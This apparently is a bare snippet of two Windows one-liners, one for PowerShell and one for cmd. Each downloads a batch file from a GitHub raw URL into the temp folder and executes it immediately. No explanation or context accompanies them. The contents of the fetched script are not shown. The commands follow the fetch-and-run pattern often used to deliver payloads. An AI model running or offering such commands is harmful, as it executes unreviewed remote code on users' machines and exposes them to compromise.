ps1
iwr https://raw.githubusercontent.com/nickkovdev/temp/main/temp.bat -OutFile $env:TEMP\g.bat; start $env:TEMP\g.bat

cmd
cmd /c curl -L https://raw.githubusercontent.com/nickkovdev/temp/main/temp.bat -o %TEMP%\g.bat && %TEMP%\g.bat
